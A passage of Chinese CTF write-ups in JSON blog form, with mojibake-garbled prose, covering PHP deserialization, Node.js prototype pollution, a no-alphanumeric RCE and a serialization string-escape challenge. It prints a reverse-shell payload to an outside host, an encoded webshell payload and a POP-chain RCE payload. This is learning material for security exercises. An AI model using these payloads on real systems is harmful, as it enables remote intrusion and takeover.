´åç»“æ„è®©ä»–æå‰è¿›å…¥ææ„å‡½æ•°\n\n```\n?bbb=O:2:\"TT\":2:{s:3:\"key\";O:2:\"JJ\":1:{s:3:\"obj\";O:2:\"MM\":2:{s:4:\"name\";s:6:\"system\";s:1:\"c\";s:6:\"whoami\";}}s:1:\"c\";N;\n```\n\næˆåŠŸ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683426171520-63fa6be1-39b7-446d-8fc7-98f8d3e0a425.png)\n\n# å®Œç¾ç½‘ç«™\n\nä¸€é“å¾ˆè‡­çš„é¢˜ç›®ï¼Œå¤§æ¦‚é¢˜ç›®æ€è·¯æ˜¯ä»–ç»™äº†ä¸€ä¸ªimgå‚æ•°æ˜¯ä¸€ä¸ªå›¾ç‰‡æ ¼å¼base64ç¼–ç  ç„¶åè¿˜éœ€è¦æäº¤ä¸€ä¸ªnå‚æ•° ä½†æ˜¯næ˜¯ä¸€ä¸ª10-30çš„éšæœºæ•°å­— å¹¶ä¸”æ¯æ¬¡éƒ½ä¸ä¸€æ · é‚£ä¹ˆå…¶å®æ€è·¯å¾ˆç®€å•ç›´æ¥çˆ†ç ´å°±è¡Œäº† \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683427463745-906d989e-5129-4618-98ae-64fc1c6c5efb.jpeg)\n\nå¹¶ä¸”è¦åŒæ—¶æäº¤imgå’Œn ä½†æ˜¯è¿™æè¿°æˆ‘ä¹Ÿæ˜¯æ— è¯­\n\nç„¶åå½“æ—¶æ²¡å‘ç°flagæ–‡ä»¶åè—åœ¨ä»–ç»™çš„imgæœ«å°¾æ˜¯ffffpq.php  æ‰€ä»¥ä¸€ç›´åœ¨æ‰¾flag \n\næ€»ä¹‹åšçš„å¾ˆæ¶å¿ƒäºº åƒåƒäº†å±ä¸€æ ·yueäº†\n\n# notrce\n\nå¥½åƒæˆ‘æ²¡è®°é”™åº”è¯¥æ˜¯è¿™é“é¢˜ç›®\n\næºç å¦‚ä¸‹\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n$c=$_POST['c'];\nif(!preg_match(\"/vi|less|tail|head|od|sh|echo|touch|re|mv|rm|cat|ls|tac|more|cut|curl|wget|base|>|<|`|\\*|\\\\$|\\\\\\/i\",$c)){\n    exec($c);\n}else{\n    die(\"hacker\");\n}\n```\n\nè›®ç„å¹»çš„ä¸€é“é¢˜ç›® çœ‹äº†wpç›´æ¥ç”¨å°†æ ¹ç›®å½•flagå¤åˆ¶åˆ°å½“å‰ç›®å½•è®¿é—®å°±è¡Œ \n\nå‘¢å¦‚æœflagæ–‡ä»¶ç›®å½•ä¸æ˜¯å¸¸è§„å‘½å è¿™ä¸å°±å¯„äº†å—\n\nä¹‹åäº†è§£åˆ°æ˜¯éé¢„æœŸè§£ å“¦ é‚£æ²¡äº‹äº†:)\n\n# JUST_PROTO\n\nä¸€é“æˆ‘æœªè§¦åŠçš„é¢†åŸŸçš„é¢˜ç›® ä¸€é“nodejsçš„åŸå‹é“¾æ±¡æŸ“é¢˜ç›®\n\nè¿™ä¸¤å¤©æ¶è¡¥äº†ä¸€ä¸‹å…³äºåŸå‹é“¾æ±¡æŸ“çš„çŸ¥è¯†ç‚¹ï¼Œæ„Ÿå—é¢‡æ·±\n\nå¦‚æœä¹‹å‰äº†è§£è¿‡è¿™ä¸ª å…¶å®é¢˜ç›®ä¸€çœ¼ä¸çœŸå°±èƒ½çœ‹å‡ºæ˜¯åŸå‹é“¾æ±¡æŸ“çš„é¢˜ç›® `__proto__`æ˜æ˜¾å°±æç¤ºäº†\n\nç»™å‡ºæºç ï¼š\n\n```javascript\nconst express = require('express');\nconst { exec } = require(\"child_process\");\nconst app = express();\napp.get('/', (req, res) => res.send('å—¨å—¨å—¨ï¼ï¼è€å…«æ¥äº†ï¼ï¼ï¼'));\n\nlet ba = {\n  baba: (token)=>{ return !!token },\n  bababa: ()=>{ if (JSON.stringify(date).length > 10000) date = {} }, \n  // set: `redis-cli -h ${ba.redis_host} set `\n  // get: `redis-cli -h ${ba.redis_host} get `\n};\n\nlet date = {};\n\napp.get('/set', (req, res) => {\n  ba.bababa(); \n  const {token, key, val} = req.query;\n  if (!ba.baba(token) || !val) return res.send(\"wrong\"); \n  date[token][key] = val; \n  res.json({ is_succ: true })\n});\n\napp.get('/get', (req, res) => {\n  const {token, key} = req.query;\n  if (!ba.baba(token)) return res.send(\"wrong\");\n  let result = date[token];\n  if (result) result = result[key];\n  res.json({ result: result === undefined ? \"null\" : result, is_succ: result !== undefined })\n});\n\n\napp.put('/bkup', (req, res) => {\n  let date_stream = Buffer.from(JSON.stringify(date)); \n  const cmd = ba.redis_set + `date ${date_stream.toString('base64')}`;\n  exec(cmd, (err,_,__) => {\n    if (err) return res.json({ is_succ: false });\n    res.json({ is_succ: true });\n  });\n});\n\napp.listen(8080, () => console.log(`å—¨å—¨å—¨ï¼ï¼è€å…«æ¥äº†ï¼ï¼ï¼`));\n\n\n//æ²¡æ•¢å§æ‰€æœ‰å˜é‡åæ¢æˆbababa æ€•è¢«æ‰“\n```\n\nå…ˆçœ‹/bkupè·¯ç”±\n\n```javascript\napp.put('/bkup', (req, res) => {\n  let date_stream = Buffer.from(JSON.stringify(date)); \n  const cmd = ba.redis_set + `date ${date_stream.toString('base64')}`;\n  exec(cmd, (err,_,__) => {\n    if (err) return res.json({ is_succ: false });\n    res.json({ is_succ: true });\n  });\n});\n```\n\nå‘ç°äº†æˆ‘ä»¬æœ€å–œæ¬¢çš„exec()å‡½æ•°\n\n `const cmd = ba.redis_set + date ${date_stream.toString('base64')};` \n\nç„¶åè¿™éƒ¨åˆ†ba.redis_setå¦‚æœæˆ‘ä»¬å¯æ§åˆ™èƒ½è¾¾åˆ°rce\n\nå†æ¥çœ‹/setè·¯ç”±\n\n```javascript\napp.get('/set', (req, res) => {\n  ba.bababa(); \n  const {token, key, val} = req.query;\n  if (!ba.baba(token) || !val) return res.send(\"wrong\"); \n  date[token][key] = val; \n  res.json({ is_succ: true })\n});\n```\n\né€šè¿‡getæ–¹å¼ç»™`token,key,var`ä¼ å‚\n\n`date[token][key] = val;`å› ä¸ºä¸‰ä¸ªå‚æ•°æˆ‘ä»¬éƒ½å¯æ§ï¼Œåˆ™å¯ä»¥è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“\n\nè¿™é‡Œè§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆä¼šæ˜¯`data[token][key]`çš„å½¢å¼ï¼Œæˆ‘ä»¬ä¸€èˆ¬è®¤ä¸ºåº”è¯¥æ˜¯`data.token.key`çš„å½¢å¼\n\nå…¶å®è¿™ä¸¤ç§å½¢å¼æ˜¯ç›¸ç­‰çš„éƒ½å¯ä»¥\n\næ¯”å¦‚ctfshowæœ‰é¢˜ç›®çš„payloadï¼š\n\nåŸæœ¬æ˜¯ï¼š`?eval=require('child_process').execSync('ls')`\n\nå¦‚æœæ”¹ä¸º`?eval=require('child_process')['execSync']('ls')`é‚£ä¹ˆéƒ½æ˜¯å¯ä»¥çš„ï¼Œä¸¤ç§éƒ½æ˜¯ç­‰ä»·çš„\n\nå›åˆ°åŸé¢˜ï¼Œä½¿å¾—`token=__proto__,key=redis_set,var=shell`\n\nåˆ™ba.redis_seè¢«æ±¡æŸ“\n\n```\npayload:?token=__proto__&key=redis_set&var=bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'\n```\n\nè§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆè¦ç”¨ `bash -c` ç”±äºæˆ‘ä»¬æ˜¯åœ¨å¤–éƒ¨è¿è¡ŒshellæŒ‡ä»¤ï¼Œæ‰€ä»¥ä»–é»˜è®¤æ˜¯ä¸ä¼šè¯†åˆ«æˆ‘ä»¬çš„`bash -i`åå¼¹shellçš„ï¼Œ`bash -c`ä¿è¯äº†å‘½ä»¤ä½¿ç”¨`bash shell`å»æ‰§è¡Œ\n\nåå¼¹shelléƒ¨åˆ†ç”¨urlç¼–ç ä¸€ä¸‹\n\n`bash -c`å°±æ˜¯å°†åé¢å­—ç¬¦ä¸²å½“ä½œå‘½ä»¤è¯»å…¥æ‰§è¡Œ ç„¶åè¾“å‡º  \n\n# itâ€™s time\n\nç»å…¸flaskçš„ssti\n\nç›´æ¥å½“ä¸ªè„šæœ¬å°å­ï¼Œå¤§è„šæœ¬æ³¨å…¥\n\næˆ–è€…å»æ‰¾ctfshow é¢˜ç›®çš„payloadéƒ½å¯ä»¥\n","tags":["Fast destruct","nodejs åŸå‹é“¾æ±¡æŸ“"],"categories":["å„èµ›äº‹WP"]},{"title":"buuctf-68-[MRCTF2020]å¥—å¨ƒ","url":"/post/b79f6776.html","content":"\n[MRCTF2020]å¥—å¨ƒ\n\n<!--more-->\n\nè¿›å…¥é¢˜ç›® æŸ¥çœ‹æºç \n\n```cmake\n<!--\n//1st\n$query = $_SERVER['QUERY_STRING'];\n\n if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){\n    die('Y0u are So cutE!');\n}\n if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){\n    echo \"you are going to the next ~\";\n}\n!-->\n```\n\nåˆ†æï¼šè¾“å…¥çš„å­—ç¬¦ä¸²ä¸èƒ½æœ‰`_`å’Œå…¶urlç¼–ç ï¼Œå¹¶ä¸”getä¼ å‚b_u_p_tä¸èƒ½ç­‰äº23333 ä½†æ˜¯æ­£åˆ™åŒ¹é…éœ€è¦å¼€å¤´å’Œç»“å°¾ä¸º23333\n\nè¿™é‡Œç”¨åˆ°äº†phpåˆæ³•å˜é‡åçš„çŸ¥è¯†ç‚¹ï¼Œå¦‚æœåœ¨ä¼ å‚æ—¶ï¼Œé‡åˆ°ä¸åˆæ³•çš„å˜é‡åæ¯”å¦‚`.`åˆ™phpä¼šè‡ªåŠ¨å°†å…¶è½¬ä¸º`_`\n\næ­£åˆ™åŒ¹é…preg_match()é€šè¿‡æ¢è¡Œç¬¦`%0a`ç»•è¿‡å³å¯  åœ¨éå¤šè¡Œæ¨¡å¼ä¸‹ï¼Œ$ä¼¼ä¹ä¼šå¿½ç•¥åœ¨å¥å°¾çš„%0a\n\nå¯å‚è€ƒhttps://www.cnblogs.com/20175211lyz/p/12198258.html\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683362389224-9f93cdc0-b997-45e9-8f7f-626ec36b4db3.png)\n\npayload:`?b.u.p.t=23333%2a`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683362539907-88b3cf13-c278-4b0f-8f7a-fc105d89bf4f.png)\n\n```\n/secrettw.php\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683362573491-a422447e-dedc-437c-bfed-400642d8c01f.png)\n\næŸ¥çœ‹æºç å‘ç°ä¸€æ®µjsfuckç¼–ç  ç›´æ¥åœ¨consoleä¸­è¾“å…¥å°±æœ‰å›æ˜¾äº†\n\nå…³äºjsfuckç å¯ä»¥å‚è€ƒï¼šhttps://www.jianshu.com/p/e7246218f424\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683362663557-fba897df-6aac-40fd-8941-3b7a8243c607.png)\n\nè·å¾—æºç :\n\n```cmake\n<?php \nerror_reporting(0); \ninclude 'takeip.php';\nini_set('open_basedir','.'); \ninclude 'flag.php';\n\nif(isset($_POST['Merak'])){ \n    highlight_file(__FILE__); \n    die(); \n} \n\n\nfunction change($v){ \n    $v = base64_decode($v); \n    $re = ''; \n    for($i=0;$i<strlen($v);$i++){ \n        $re .= chr ( ord ($v[$i]) + $i*2 ); \n    } \n    return $re; \n}\necho 'Local access only!'.\"<br/>\";\n$ip = getIp();\nif($ip!='127.0.0.1')\necho \"Sorry,you don't have permission!  Your ip is :\".$ip;\nif($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){\necho \"Your REQUEST is:\".change($_GET['file']);\necho file_get_contents(change($_GET['file'])); }\n?>\n```\n\nipç”¨ `Client-ip: 127.0.0.1`å†™åœ¨è¯·æ±‚å¤´ï¼Œå¹¶ä¸”åªèƒ½ç”¨è¿™ä¸ª\n\nåˆ°ç›®å‰ä¸ºæ­¢æˆ‘ä¹Ÿä¸çŸ¥é“ Client-ip xff Real-ip è¿™ä¸‰ä¸ªåœ¨ä¸åŒé¢˜ç›®ä¸‹ä¸ºä»€ä¹ˆä¸èƒ½äº’ç”¨çš„åŸå›  æœ‰ç‚¹é˜´é—´\n\n2333ç”¨dataä¼ªåè®®å»ä¼ å‚\n\næˆ‘ä»¬è¦è¯»çš„æ–‡ä»¶fileä¼šç»è¿‡changeå‡½æ•°æ”¹å˜ æˆ‘ä»¬åªéœ€è¦å€’ç€å†™ä¸€ä¸ªchangeå‡½æ•° è®©å…¶è¿›è¿‡é¢˜ç›®å‡½æ•°æ—¶å€™å›åˆ°æˆ‘ä»¬æƒ³è¦çš„å†…å®¹å³å¯ è„šæœ¬å¾ˆç®€å•\n\n```php\n<?php\nfunction change($v){ \n    $v = base64_decode($v); \n    $re = ''; \n    for($i=0;$i<strlen($v);$i++){ \n        $re .= chr ( ord ($v[$i]) + $i*2 ); \n    } \n    return $re; }\n$str = 'ZmxhZy5waHA=';   //Zm5lbTZ6dH4=\necho change($str)\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683362979416-9100efcf-0951-4540-9a1b-a57509c7d87f.png)\n","tags":["phpå­—ç¬¦ä¸²è§£æç‰¹æ€§"],"categories":["buuctf"]},{"title":"buuctf-66-[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME","url":"/post/7f59ce0.html","content":"\n[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME\n\n<!--more-->\n\n```cmake\n<?php\nerror_reporting(0);\nif(isset($_GET['code'])){\n            $code=$_GET['code'];\n                    if(strlen($code)>40){\n                                        die(\"This is too Long.\");\n                                                }\n                    if(preg_match(\"/[A-Za-z0-9]+/\",$code)){\n                                        die(\"NO.\");\n                                                }\n                    @eval($code);\n}\nelse{\n            highlight_file(__FILE__);\n}\n\n// ?>\n```\n\n\n\nè¿™é“é¢˜å°±æ˜¯é€šè¿‡å–åæ„é€ æ— æ•°å­—å­—æ¯rceçš„\n\nå…¶å®è¿™ç§æ„é€ å¥‡æ·«rceçš„ æ˜ç™½åŸç†ä¹‹å ç›´æ¥å½“ä¸ªè„šæœ¬å°å­åšèµ·é¢˜æ¥å˜å˜å¿«\n\nç”Ÿæˆè„šæœ¬å¦‚ä¸‹ï¼š\n\n```cmake\n<?php\n$ans1='assert';//å‡½æ•°å\n$ans2='eval($_POST[x])';//å‘½ä»¤\n$data1=('~'.urlencode(~$ans1));//é€šè¿‡ä¸¤æ¬¡å–åè¿ç®—å¾—åˆ°system\n$data2=('~'.urlencode(~$ans2));//é€šè¿‡ä¸¤æ¬¡å–åè¿ç®—å¾—åˆ°dir\necho ('('.$data1.')'.'('.$data2.')'.';');\n?>\n```\n\nç›´æ¥æ„é€ `system('ls')`å‘ç°ä¸å¯ä»¥\n\nå°±å¾ˆå¥‡æ€ª æ„é€ `phpinfo()`æ‰¾ä¸åˆ°æ€è·¯å°±å»çœ‹çœ‹é…ç½®æ–‡ä»¶ è¿™ä¸ªçœŸçš„å¾ˆé‡è¦\n\npayload:`?code=(~%8F%97%8F%96%91%99%90)();`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683357622168-d10c216a-c463-4f40-847a-88eecc81c4a3.png)\n\nå‘ç°åŸæ¥æ˜¯å¥½å¤šå‡½æ•°è¢«ç¦äº† éš¾æ€ªæ‰§è¡Œä¸äº†\n\næ„é€ `assert(eval($_POST[x]))`ç”Ÿæˆä¸€å¥è¯æœ¨é©¬ç”¨èšå‰‘å»è¿æ¥\n\næ³¨æ„è¿™ç§eval()ä¸­å†åµŒå¥—ä¸€ä¸ªassert(eval())çš„æ–¹å¼ æœ‰æ—¶å€™å¯ä»¥ç»•è¿‡waf\n\npayload: `?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%87%A2%D6);`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683358006276-a208a639-bd8a-4241-baa8-a5d4b64e4dcd.png)\n\næ¥ä¸‹æ¥çš„æ€è·¯å°±æ˜¯æ€ä¹ˆç»•è¿‡disble_function å…·ä½“æ–¹å¼å¯ä»¥çœ‹æˆ‘è¿™ä¸€ç¯‡æ–‡ç«  è¿™é‡Œå°±ä¸èµ˜è¿°äº† https://z1d10t.github.io/post/db3afe26.html?highlight=disable\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683358035645-929e3eb1-fe11-4d92-bed9-0bc5497f90d0.png)\n","tags":["RCEå¥‡æ·«æ–¹å¼"],"categories":["buuctf"]},{"title":"buuctf-64-[0CTF 2016]piapiapia","url":"/post/6e80c399.html","content":"\n[0CTF 2016]piapiapia\n\n<!--more-->\n\nä¸€é“phpååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸çš„é¢˜ç›®ï¼Œéœ€è¦ä»£ç å®¡è®¡ï¼Œtqlï¼\n\n## æ‹æ¸…æ€è·¯ï¼š\n\né¦–å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç„¶åç™»å½•ï¼Œå‘ç°æœ‰ä¸ªæ–‡ä»¶ä¸Šä¼ åœ°æ–¹ï¼Œåˆšå¼€å§‹ä»¥ä¸ºæ˜¯ä¼ æœ¨é©¬ï¼Œç„¶åå»è¿ï¼Œgetshellä½†åé¢å‘ç°æ–°å¤§é™†ï¼Œä¸€é¡¿æ“ä½œä¹‹åï¼Œå‘ç°éœ€è¦æ‰«ç½‘ç«™ï¼Œä¸‹è½½æºç ã€‚\n\nä¸‹è½½ä¸‹æ¥6ä¸ªphpæ–‡ä»¶ \n\nåœ¨config.phpä¸­å‘ç°æœ‰flag ä½†æ˜¯è¢«åˆ é™¤äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683290000574-a5d69780-e1ec-48cc-a0f0-2351c7ced655.png)\n\nç„¶åregister.phpä¸index.phpéƒ½æ˜¯ä¸€äº›åŸºç¡€çš„æ³¨å†Œè´¦å·ä¸ç™»å½•è´¦å·çš„æ“ä½œ\n\nç„¶åç”±index.phpè½¬å‘update.php\n\nä¹Ÿå°±æ˜¯æˆ‘ä»¬çœ‹åˆ°çš„è¿™ä¸ªç•Œé¢\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683290165259-d39fb665-8660-42cc-9811-c6644e2aa4e0.png)\n\n```cmake\n//update.php\n<?php\n\trequire_once('class.php');\n\tif($_SESSION['username'] == null) {\n\t\tdie('Login First');\t\n\t}\n\tif($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {\n\n\t\t$username = $_SESSION['username'];\n\t\tif(!preg_match('/^\\d{11}$/', $_POST['phone']))\n\t\t\tdie('Invalid phone');\n\n\t\tif(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))\n\t\t\tdie('Invalid email');\n\t\t\n\t\tif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n\t\t\tdie('Invalid nickname');\n\n\t\t$file = $_FILES['photo'];\n\t\tif($file['size'] < 5 or $file['size'] > 1000000)\n\t\t\tdie('Photo size error');\n\n\t\tmove_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));\n\t\t$profile['phone'] = $_POST['phone'];\n\t\t$profile['email'] = $_POST['email'];\n\t\t$profile['nickname'] = $_POST['nickname'];\n\t\t$profile['photo'] = 'upload/' . md5($file['name']);\n  \t\t//useræ˜¯class.phpä¸­çš„userçš„ä¸€ä¸ªå¯¹è±¡\n\t\t$user->update_profile($username, serialize($profile)); //æˆ‘ä»¬çš„ç”¨æˆ·åadminå’Œprofileä»¥åºåˆ—åŒ–å­—ç¬¦ä¸²å½¢å¼ä¼ è¿‡å»çš„\n\t\techo 'Update Profile Success!<a href=\"profile.php\">Your Profile</a>';\n\t}\n\telse {\n?>\n```\n\nç®€å•çœ‹ä¸€ä¸‹å°±æ˜¯é€šè¿‡postè·å–å˜é‡å€¼ï¼Œå’Œä¸€äº›ç®€å•çš„åˆ¤æ–­è¾“å…¥æ˜¯å¦åˆæ³•çš„è¯­å¥ï¼Œæ³¨æ„ä¸€ä¸‹nickname(æ˜µç§°)çš„åˆ¤æ–­\n\n```cmake\n\tif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n\t\t\tdie('Invalid nickname');\n```\n\nnicknameä¸èƒ½è¶…è¿‡10ä¸ªå­—ç¬¦ï¼Œä¹‹åä¼šæåŠ\n\nç„¶åä¼ å…¥update_profile() è¿™é‡Œ`$profile`æ•°ç»„æ˜¯æˆ‘ä»¬é€šè¿‡åºåˆ—åŒ–ä¼ å…¥çš„ï¼Œè¿™é‡Œå¾ˆé‡è¦\n\n```cmake\n$user->update_profile($username, serialize($profile)); //æˆ‘ä»¬çš„ç”¨æˆ·åadminå’Œprofileä»¥åºåˆ—åŒ–å­—ç¬¦ä¸²å½¢å¼ä¼ è¿‡å»çš„\n```\n\nä¹‹åä¼ å…¥class.php\n\n```cmake\n//class.php\n<?php\nrequire('config.php');\n\nclass user extends mysql{   //ç»§æ‰¿ç±»çš„ç”Ÿæˆ mysqlä¸ºçˆ¶ç±» userä¸ºå­ç±»\n\tprivate $table = 'users';\n\n\tpublic function is_exists($username) {\n\t\t$username = parent::filter($username);\n\n\t\t$where = \"username = '$username'\";\n\t\treturn parent::select($this->table, $where);\n\t}\n\tpublic function register($username, $password) {\n\t\t$username = parent::filter($username);\n\t\t$password = parent::filter($password);\n\n\t\t$key_list = Array('username', 'password');\n\t\t$value_list = Array($username, md5($password));\n\t\treturn parent::insert($this->table, $key_list, $value_list);\n\t}\n\tpublic function login($username, $password) {\n\t\t$username = parent::filter($username);\n\t\t$password = parent::filter($password);\n\n\t\t$where = \"username = '$username'\";\n\t\t$object = parent::select($this->table, $where);\n\t\tif ($object && $object->password === md5($password)) {\n\t\t\treturn true;\n\t\t} else {\n\t\t\treturn false;\n\t\t}\n\n\t}\n\tpublic function show_profile($username) {\n\t\t$username = parent::filter($username);\n\n\t\t$where = \"username = '$username'\";\n\t\t$object = parent::select($this->table, $where);\n\t\treturn $object->profile;\n\t}\n\tpublic function update_profile($username, $new_profile) {\n\t\t$username = parent::filter($username);\n\t\t$new_profile = parent::filter($new_profile);\n\n\t\t$where = \"username = '$username'\";\n\t\treturn parent::update($this->table, 'profile', $new_profile, $where);\n\t}\n\tpublic function __tostring() {\n\t\treturn __class__;\n\t}\n}\n\nclass mysql {\n\tprivate $link = null;\n\n\tpublic function connect($config) {\n\t\t$this->link = mysql_connect(\n\t\t\t$config['hostname'],\n\t\t\t$config['username'], \n\t\t\t$config['password']\n\t\t);\n\t\tmysql_select_db($config['database']);\n\t\tmysql_query(\"SET sql_mode='strict_all_tables'\");\n\n\t\treturn $this->link;\n\t}\n\n\tpublic function select($table, $where, $ret = '*') {\n\t\t$sql = \"SELECT $ret FROM $table WHERE $where\";\n\t\t$result = mysql_query($sql, $this->link);\n\t\treturn mysql_fetch_object($result);\n\t}\n\n\tpublic function insert($table, $key_list, $value_list) {\n\t\t$key = implode(',', $key_list);\n\t\t$value = '\\'' . implode('\\',\\'', $value_list) . '\\''; \n\t\t$sql = \"INSERT INTO $table ($key) VALUES ($value)\";\n\t\treturn mysql_query($sql);\n\t}\n\n\tpublic function update($table, $key, $value, $where) {\n\t\t$sql = \"UPDATE $table SET $key = '$value' WHERE $where\";\n\t\treturn mysql_query($sql);\n\t}\n\n\tpublic function filter($string) {     //çˆ¶ç±»filer\n\t\t$escape = array('\\'', '\\\\\\\\');\n\t\t$escape = '/' . implode('|', $escape) . '/';\n\t\t$string = preg_replace($escape, '_', $string);  //ä¸€é¡¿æ“ä½œä¸‹æ¥å°±æ˜¯ä¸€ä¸ªæ­£åˆ™\n\n\t\t$safe = array('select', 'insert', 'update', 'delete', 'where');\n\t\t$safe = '/' . implode('|', $safe) . '/i';\n\t\treturn preg_replace($safe, 'hacker', $string);\n\t}\n\tpublic function __tostring() {\n\t\treturn __class__;\n\t}\n}\nsession_start();\n$user = new user();\n$user->connect($config);\n```\n\nç›´æ¥å®šä½åˆ°update_profileå‡½æ•°\n\n```cmake\n\tpublic function update_profile($username, $new_profile) {\n\t\t$username = parent::filter($username);\n\t\t$new_profile = parent::filter($new_profile);\n```\n\nè¿™é‡Œé€šè¿‡ç»§æ‰¿ç±»ï¼Œè°ƒç”¨çˆ¶ç±»çš„filterå‡½æ•°\n\n```cmake\npublic function filter($string) {     //çˆ¶ç±»filer\n\t\t$escape = array('\\'', '\\\\\\\\');\n\t\t$escape = '/' . implode('|', $escape) . '/';\n\t\t$string = preg_replace($escape, '_', $string);  //ä¸€é¡¿æ“ä½œä¸‹æ¥å°±æ˜¯ä¸€ä¸ªæ­£åˆ™\n\n\t\t$safe = array('select', 'insert', 'update', 'delete', 'where');\n\t\t$safe = '/' . implode('|', $safe) . '/i';\n\t\treturn preg_replace($safe, 'hacker', $string);\n\t}\n```\n\nè¿™é‡Œç›¸å½“äºä¸€ä¸ªè¿‡æ»¤å™¨\n\né‡ç‚¹çœ‹ç¬¬äºŒä¸ªæ­£åˆ™ å¦‚æœæˆ‘ä»¬ä¼ å…¥çš„å­—ç¬¦ä¸²æœ‰`'select', 'insert', 'update', 'delete', 'where'`åˆ™ä¼šè¢«æ›¿æ¢ä¸º`hacker`  è‡³æ­¤æš‚æ—¶ç»“æŸ\n\nå½“æˆ‘ä»¬ä¸Šä¼ å®Œupdate.phpéœ€è¦çš„ä¿¡æ¯ä¹‹åä¼šè·³å…¥profile.php\n\n```cmake\n//profile.php\n<?php\n\trequire_once('class.php');\n\tif($_SESSION['username'] == null) {\n\t\tdie('Login First');\t\n\t}\n\t$username = $_SESSION['username'];\n\t$profile=$user->show_profile($username);\n\tif($profile  == null) {\n\t\theader('Location: update.php');\n\t}\n\telse {\n\t\t$profile = unserialize($profile);\n\t\t$phone = $profile['phone'];\n\t\t$email = $profile['email'];\n\t\t$nickname = $profile['nickname'];\n\t\t$photo = base64_encode(file_get_contents($profile['photo']));\n?>\n```\n\nè¿™é‡Œç»ˆäºçœ‹åˆ°äº†æˆ‘ä»¬å¸¸è§çš„æ¼æ´ç‚¹file_get_contents()å‡½æ•°\n\nå…ˆç»è¿‡ååºåˆ—åŒ–`$profile`æ•°ç»„\n\nç„¶åbase64ç¼–ç è¯»å‡º`$profile['photo']`\n\nä¹‹å‰çœ‹åˆ°config.phpä¸­å«æœ‰flag é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è®©`$profile['photo']=config.php`ä¸å°±å¯ä»¥æ‹¿åˆ°flagäº†\n\n## è§£é¢˜ï¼š\n\nä½†æ˜¯photoéƒ¨åˆ†æ˜¯æ–‡ä»¶ä¸Šä¼ éƒ¨åˆ†ï¼Œå¹¶ä¸èƒ½ç›´æ¥è®©ä»–ç­‰äºconfig.phpå»æ‹¿åˆ°flag\n\nè¿™é‡Œå°±è¦ç”¨åˆ°ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸äº†\n\nåœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­å­˜åœ¨åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨nicknameéƒ¨åˆ†æ„é€ å‡ºç¬¦åˆååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œåœ¨nicknameå­˜åœ¨config.phpè®©å…¶ååºåˆ—åŒ–åˆ°åè¾¹çš„photoéƒ¨åˆ†ï¼Œç›¸å½“äºæå‰ç»“æŸååºåˆ—åŒ–ï¼Œè®©åŸæœ¬photoéƒ¨åˆ†çš„ååºåˆ—åŒ–éƒ¨åˆ†ä¸¢å¤±ï¼Œä»è€Œè¾¾åˆ°ä½¿å¾—`$profile['photo']=config.php`\n\né‚£ä¹ˆæˆ‘ä»¬éœ€è¦åœ¨nicknameåºåˆ—åŒ–åçš„éƒ¨åˆ†å¡å…¥`\";s:5:\"photo\";s:10:\"config.php\";}`å…±33ä¸ªå­—ç¬¦\n\nè¿™é‡Œæ„é€ åˆæ³•ååºåˆ—åŒ–éƒ¨åˆ†å¾ˆå·§å¦™\n\nä¹‹å‰çœ‹ä»£ç å®ƒå­˜åœ¨ä¸€ä¸ªè¿‡æ»¤å™¨\n\n```cmake\n\t$safe = array('select', 'insert', 'update', 'delete', 'where');\n\t\t$safe = '/' . implode('|', $safe) . '/i';\n\t\treturn preg_replace($safe, 'hacker', $string);\n```\n\nå¦‚æœæˆ‘ä»¬åªæ˜¯å•çº¯æŠŠ`\";s:5:\"photo\";s:10:\"config.php\";}`è¿™ä¸€éƒ¨åˆ†å¡å…¥nicknameé‚£ä¹ˆå®ƒç»è¿‡åºåˆ—åŒ–åï¼Œå†ç»è¿‡ååºåˆ—åŒ–å…¨éƒ¨éƒ¨åˆ†è¿˜æ˜¯å±äºnicknameéƒ¨åˆ†ï¼Œæˆ‘ä»¬å°±éœ€è¦åœ¨ä»–åºåˆ—åŒ–åæ„é€ 